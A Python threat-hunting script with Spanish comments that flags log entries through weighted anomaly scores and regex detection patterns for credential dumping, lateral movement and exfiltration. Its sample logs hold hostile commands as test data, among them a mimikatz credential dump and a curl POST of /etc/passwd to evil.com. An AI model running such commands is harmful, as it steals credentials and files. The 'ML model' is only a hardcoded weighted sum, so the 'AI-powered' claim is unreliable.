
#!/usr/bin/env python3
"""
BOFA AI-Powered Threat Hunter v2.0
Detecta amenazas usando machine learning local y correlación de eventos
Author: @descambiado
"""

import json
import pandas as pd
import numpy as np
from datetime import datetime, timedelta
import pickle
import re
from typing import Dict, List, Any
import hashlib
import yaml
import os

class ThreatHunter:
    def __init__(self):
        self.anomaly_threshold = 0.7
        self.mitre_mappings = self.load_mitre_mappings()
        self.ml_model = self.load_or_create_model()
        self.threat_patterns = self.load_threat_patterns()
        
    def load_mitre_mappings(self) -> Dict:
        """Carga mapeos de MITRE ATT&CK"""
        return {
            "T1055": {"name": "Process Injection", "severity": "high"},
            "T1003": {"name": "OS Credential Dumping", "severity": "critical"},
            "T1082": {"name": "System Information Discovery", "severity": "medium"},
            "T1070": {"name": "Indicator Removal", "severity": "high"},
            "T1059": {"name": "Command and Scripting Interpreter", "severity": "medium"},
            "T1190": {"name": "Exploit Public-Facing Application", "severity": "critical"},
            "T1566": {"name": "Phishing", "severity": "high"},
            "T1105": {"name": "Ingress Tool Transfer", "severity": "medium"}
        }
    
    def load_threat_patterns(self) -> List[Dict]:
        """Carga patrones de amenazas conocidas"""
        return [
            {
                "name": "Suspicious PowerShell",
                "pattern": r"powershell.*(invoke|download|bypass|hidden|encoded)",
                "mitre_id": "T1059.001",
                "severity": "high"
            },
            {
                "name": "Credential Dumping",
                "pattern": r"(mimikatz|sekurlsa|lsadump|hashdump)",
                "mitre_id": "T1003",
                "severity": "critical"
            },
            {
                "name": "Lateral Movement",
                "pattern": r"(psexec|wmic|schtasks).*\\\\",
                "mitre_id": "T1021",
                "severity": "high"
            },
            {
                "name": "Data Exfiltration",
                "pattern": r"(curl|wget|ftp).*\.(txt|doc|pdf|xlsx)",
                "mitre_id": "T1041",
                "severity": "medium"
            }
        ]
    
    def load_or_create_model(self):
        """Carga o crea modelo ML básico"""
        # Simulación de modelo ML - en producción usaría scikit-learn
        return {
            "version": "1.0",
            "features": ["command_length", "special_chars", "time_anomaly", "user_anomaly"],
            "weights": [0.2, 0.3, 0.25, 0.25]
        }
    
    def extract_features(self, log_entry: Dict) -> List[float]:
        """Extrae características del log para ML"""
        command = log_entry.get('command', '')
        user = log_entry.get('user', '')
        timestamp = log_entry.get('timestamp', '')
        
        features = []
        
        # Feature 1: Longitud del comando (normalizada)
        features.append(min(len(command) / 100.0, 1.0))
        
        # Feature 2: Caracteres especiales
        special_chars = len(re.findall(r'[&|;`$<>{}()]', command))
        features.append(min(special_chars / 10.0, 1.0))
        
        # Feature 3: Anomalía temporal (horario inusual)
        if timestamp:
            try:
                dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
                hour = dt.hour
                # Horario inusual: 00-06 o 22-23
                time_anomaly = 1.0 if (hour <= 6 or hour >= 22) else 0.0
                features.append(time_anomaly)
            except:
                features.append(0.0)
        else:
            features.append(0.0)
        
        # Feature 4: Usuario privilegiado
        privileged_users = ['root', 'administrator', 'admin', 'system']
        user_anomaly = 1.0 if user.lower() in privileged_users else 0.0
        features.append(user_anomaly)
        
        return features
    
    def calculate_anomaly_score(self, features: List[float]) -> float:
        """Calcula puntuación de anomalía usando modelo ML"""
        weights = self.ml_model["weights"]
        score = sum(f * w for f, w in zip(features, weights))
        return min(score, 1.0)
    
    def pattern_matching(self, log_entry: Dict) -> List[Dict]:
        """Busca patrones conocidos de amenazas"""
        command = log_entry.get('command', '').lower()
        matches = []
        
        for pattern in self.threat_patterns:
            if re.search(pattern["pattern"], command, re.IGNORECASE):
                matches.append({
                    "pattern_name": pattern["name"],
                    "mitre_id": pattern["mitre_id"],
                    "severity": pattern["severity"],
                    "mitre_info": self.mitre_mappings.get(pattern["mitre_id"], {})
                })
        
        return matches
    
    def hunt_threats(self, log_data: List[Dict]) -> Dict:
        """Función principal de hunting"""
        results = {
            "total_logs": len(log_data),
            "threats_detected": [],
            "anomalies": [],
            "mitre_techniques": set(),
            "severity_counts": {"critical": 0, "high": 0, "medium": 0, "low": 0},
            "timeline": [],
            "recommendations": []
        }
        
        print(f"[INFO] Analizando {len(log_data)} entradas de log...")
        print("[INFO] Aplicando modelos de ML y pattern matching...")
        
        for idx, log_entry in enumerate(log_data):
            # Análisis ML
            features = self.extract_features(log_entry)
            anomaly_score = self.calculate_anomaly_score(features)
            
            # Pattern matching
            pattern_matches = self.pattern_matching(log_entry)
            
            # Si hay anomalía o patrones, registrar
            if anomaly_score > self.anomaly_threshold or pattern_matches:
                threat = {
                    "log_id": idx,
                    "timestamp": log_entry.get('timestamp', ''),
                    "source": log_entry.get('source', ''),
                    "user": log_entry.get('user', ''),
                    "command": log_entry.get('command', ''),
                    "anomaly_score": round(anomaly_score, 3),
                    "patterns_matched": pattern_matches,
                    "severity": self.determine_severity(anomaly_score, pattern_matches)
                }
                
                results["threats_detected"].append(threat)
                
                # Actualizar contadores
                results["severity_counts"][threat["severity"]] += 1
                
                # Agregar técnicas MITRE
                for match in pattern_matches:
                    results["mitre_techniques"].add(match["mitre_id"])
                
                # Timeline
                results["timeline"].append({
                    "timestamp": threat["timestamp"],
                    "event": f"Threat detected: {threat['severity']} severity",
                    "details": threat["patterns_matched"]
                })
        
        # Convertir set a list para JSON
        results["mitre_techniques"] = list(results["mitre_techniques"])
        
        # Generar recomendaciones
        results["recommendations"] = self.generate_recommendations(results)
        
        print(f"[SUCCESS] Threats detectadas: {len(results['threats_detected'])}")
        print(f"[INFO] Técnicas MITRE identificadas: {len(results['mitre_techniques'])}")
        
        return results
    
    def determine_severity(self, anomaly_score: float, patterns: List[Dict]) -> str:
        """Determina severidad basada en score y patrones"""
        if any(p["severity"] == "critical" for p in patterns):
            return "critical"
        elif any(p["severity"] == "high" for p in patterns) or anomaly_score > 0.9:
            return "high"
        elif any(p["severity"] == "medium" for p in patterns) or anomaly_score > 0.8:
            return "medium"
        else:
            return "low"
    
    def generate_recommendations(self, results: Dict) -> List[str]:
        """Genera recomendaciones basadas en resultados"""
        recommendations = []
        
        if results["severity_counts"]["critical"] > 0:
            recommendations.append("🚨 CRÍTICO: Revisar inmediatamente las amenazas críticas detectadas")
            recommendations.append("🔒 Implementar controles adicionales para técnicas MITRE identificadas")
        
        if results["severity_counts"]["high"] > 5:
            recommendations.append("⚠️ Alto volumen de amenazas de alta severidad - posible campaña coordinada")
        
        if "T1003" in results["mitre_techniques"]:
            recommendations.append("🔐 Detectado credential dumping - cambiar credenciales comprometidas")
        
        if "T1055" in results["mitre_techniques"]:
            recommendations.append("🛡️ Process injection detectado - revisar integridad de procesos")
        
        total_threats = len(results["threats_detected"])
        if total_threats > results["total_logs"] * 0.1:
            recommendations.append(f"📊 {total_threats} amenazas en {results['total_logs']} logs - revisar configuración de seguridad")
        
        return recommendations

def main():
    """Función principal"""
    hunter = ThreatHunter()
    
    # Datos de ejemplo (en producción vendría de archivos de log)
    sample_logs = [
        {
            "timestamp": "2025-01-20T14:30:00Z",
            "source": "server01",
            "user": "admin",
            "command": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest\"",
            "process": "powershell.exe"
        },
        {
            "timestamp": "2025-01-20T02:15:00Z",
            "source": "workstation05",
            "user": "jdoe",
            "command": "mimikatz sekurlsa::logonpasswords",
            "process": "cmd.exe"
        },
        {
            "timestamp": "2025-01-20T15:45:00Z",
            "source": "server02",
            "user": "service_account",
            "command": "psexec \\\\target-server cmd.exe",
            "process": "psexec.exe"
        },
        {
            "timestamp": "2025-01-20T10:30:00Z",
            "source": "workstation01",
            "user": "user123",
            "command": "dir C:\\Users",
            "process": "cmd.exe"
        },
        {
            "timestamp": "2025-01-20T23:45:00Z",
            "source": "server03",
            "user": "root",
            "command": "curl -X POST https://evil.com/exfil -d @/etc/passwd",
            "process": "curl"
        }
    ]
    
    print("🔍 BOFA AI-Powered Threat Hunter v2.0")
    print("=" * 50)
    
    # Ejecutar hunting
    results = hunter.hunt_threats(sample_logs)
    
    # Mostrar resultados
    print("\n📊 RESUMEN DE RESULTADOS")
    print("=" * 30)
    print(f"Total logs analizados: {results['total_logs']}")
    print(f"Amenazas detectadas: {len(results['threats_detected'])}")
    print(f"Técnicas MITRE: {len(results['mitre_techniques'])}")
    
    print("\n🚨 SEVERIDAD")
    for severity, count in results['severity_counts'].items():
        if count > 0:
            print(f"{severity.upper()}: {count}")
    
    print("\n🎯 TÉCNICAS MITRE ATT&CK DETECTADAS")
    for technique in results['mitre_techniques']:
        info = hunter.mitre_mappings.get(technique, {})
        print(f"- {technique}: {info.get('name', 'Unknown')} ({info.get('severity', 'unknown')})")
    
    print("\n💡 RECOMENDACIONES")
    for i, rec in enumerate(results['recommendations'], 1):
        print(f"{i}. {rec}")
    
    print("\n🔍 AMENAZAS DETALLADAS")
    for threat in results['threats_detected'][:3]:  # Mostrar solo las primeras 3
        print(f"\n--- Threat ID: {threat['log_id']} ---")
        print(f"Timestamp: {threat['timestamp']}")
        print(f"Usuario: {threat['user']}")
        print(f"Comando: {threat['command'][:80]}...")
        print(f"Anomaly Score: {threat['anomaly_score']}")
        print(f"Severidad: {threat['severity'].upper()}")
        if threat['patterns_matched']:
            print("Patrones detectados:")
            for pattern in threat['patterns_matched']:
                print(f"  - {pattern['pattern_name']} ({pattern['mitre_id']})")
    
    # Exportar resultados
    output_file = f"threat_hunting_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"\n✅ Resultados exportados a: {output_file}")
    print("🔍 Threat hunting completado exitosamente!")

if __name__ == "__main__":
    main()
